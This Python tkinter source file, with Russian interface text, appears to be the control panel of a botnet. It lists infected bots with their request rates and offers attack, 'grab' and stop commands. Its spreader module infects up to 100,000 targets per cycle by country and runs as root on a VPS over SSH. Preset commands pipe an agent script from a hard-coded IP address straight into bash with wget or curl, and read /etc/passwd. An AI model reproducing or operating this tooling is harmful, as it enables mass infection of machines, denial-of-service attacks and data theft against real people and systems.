import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog
import threading, socket, json, time, subprocess, os, re, requests
from gui.widgets import RightClickMenu

COMMAND_PRESETS = {
    "wget -O- http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (wget)",
    "curl -s http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (curl)",
    "cat /etc/passwd": "Получить список пользователей",
    "whoami": "Текущий пользователь",
    "uname -a": "Информация о системе",
    "df -h": "Свободное место на дисках"
}

class BotnetTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.vps_user = "root"
        self.vps_pass = None
        self.spreader_process = None
        self.bots = {}
        self._last_fetch_error = 0
        self.my_ip = self._get_my_public_ip()
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def _get_my_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=3).text.strip()
        except:
            return None

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True)

        # ===== Вкладка "Боты" =====
        bot_frame = ttk.Frame(notebook)
        notebook.add(bot_frame, text="Боты")

        ctrl = ttk.Frame(bot_frame)
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Проверить всех", command=self.check_all_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)

        tree_frame = ttk.Frame(bot_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree.tag_configure('online', foreground='#007700')
        self.tree.tag_configure('offline', foreground='#cc0000')

        self.context_menu = tk.Menu(self.tree, tearoff=0)
        self.context_menu.add_command(label="Атака", command=self._ctx_attack)
        self.context_menu.add_command(label="Граб", command=self._ctx_grab)
        self.context_menu.add_command(label="Стоп", command=self._ctx_stop)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Выполнить команду...", command=self._ctx_exec)
        self.context_menu.add_command(label="Копировать IP", command=self._ctx_copy_ip)
        self.tree.bind("<Button-3>", self._on_right_click)

        stat = ttk.Frame(bot_frame)
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = ttk.Label(stat, text="Всего: 0")
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # ===== Вкладка "Статистика" =====
        stats_frame = ttk.Frame(notebook)
        notebook.add(stats_frame, text="Статистика")
        self.stats_text = scrolledtext.ScrolledText(stats_frame, height=15, bg='white')
        self.stats_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.update_stats()

        # ===== Вкладка "Спредер" =====
        spread_frame = ttk.Frame(notebook)
        notebook.add(spread_frame, text="Спредер")
        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)

        f = ttk.Frame(spread_frame)
        f.pack(pady=5)
        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
        self.scale_var = tk.IntVar(value=10000)
        self.spin_count = ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8)
        self.spin_count.pack(side=tk.LEFT, padx=5)

        # Выбор страны
        ttk.Label(f, text="Страна:").pack(side=tk.LEFT, padx=(10,0))
        self.country_var = tk.StringVar(value="")
        self.country_combo = ttk.Combobox(f, textvariable=self.country_var, values=["", "RU", "CN", "US", "DE", "GB", "FR", "JP", "IN", "BR"], width=4, state='readonly')
        self.country_combo.pack(side=tk.LEFT, padx=5)

        self.local_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
        self.btn_start_vps = ttk.Button(f, text="Запустить на VPS", command=self.start_spreader_vps)
        self.btn_start_vps.pack(side=tk.LEFT, padx=10)
        self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
        self.btn_check_c2.pack(side=tk.LEFT, padx=10)
        self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
        self.btn_update_vps.pack(side=tk.LEFT, padx=10)

        self.spread_progress_var = tk.DoubleVar()
        self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='determinate')
        self.spread_progress.pack(fill=tk.X, padx=5, pady=2)
        self.lbl_spread_status = ttk.Label(spread_frame, text="Готов")
        self.lbl_spread_status.pack(anchor='w', padx=5)

        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        RightClickMenu(self.spread_log,
                       get_text_func=lambda: self.spread_log.selection_get() if self.spread_log.tag_ranges(tk.SEL) else self.spread_log.get("1.0", tk.END).strip())

        # ===== Пользовательские команды =====
        cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(cmd_frame, text="Выберите команду или введите свою:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.cmd_var = tk.StringVar()
        self.cmd_combo = ttk.Combobox(cmd_frame, textvariable=self.cmd_var, values=list(COMMAND_PRESETS.keys()), width=50, state='readonly')
        self.cmd_combo.grid(row=1, column=0, padx=5, pady=2, sticky='ew')
        self.cmd_combo.bind('<<ComboboxSelected>>', self._on_cmd_select)
        self.cmd_desc_label = ttk.Label(cmd_frame, text="", foreground="#555555")
        self.cmd_desc_label.grid(row=2, column=0, padx=5, sticky='w')
        self.cmd_entry = ttk.Entry(cmd_frame, width=50)
        self.cmd_entry.grid(row=3, column=0, padx=5, pady=2, sticky='ew')
        ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).grid(row=1, column=1, padx=5)
        cmd_frame.columnconfigure(0, weight=1)
        if COMMAND_PRESETS:
            first_cmd = list(COMMAND_PRESETS.keys())[0]
            self.cmd_combo.set(first_cmd)
            self.cmd_desc_label.config(text=COMMAND_PRESETS[first_cmd])

    # ... (все методы: контекстное меню, обновление ботов, атака, граб, стоп, спредер на VPS, обновление VPS, update_vps) – идентичны предыдущей версии v25.10.8

    def update_stats(self):
        # Обновляем статистику по векторам из файла (заглушка, можно читать из C2)
        self.stats_text.delete(1.0, tk.END)
        try:
            with open("infection_stats.json") as f:
                data = json.load(f)
            for vector, count in data.items():
                self.stats_text.insert(tk.END, f"{vector}: {count}\n")
        except:
            self.stats_text.insert(tk.END, "Нет данных")
        self.after(10000, self.update_stats)

    def start_spreader_vps(self):
        count = self.scale_var.get()
        country = self.country_var.get()
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        def run():
            try:
                import paramiko
                self.spread_log.insert(tk.END, f"[*] Подключаемся к VPS...\n")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
                cmd = f"export SPREAD_COUNTRY={country}; cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
                stdin, stdout, stderr = client.exec_command(cmd)
                for line in iter(stdout.readline, ""):
                    self.spread_log.insert(tk.END, line)
                    self.spread_log.see(tk.END)
                client.close()
            except Exception as e:
                self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
        threading.Thread(target=run, daemon=True).start()
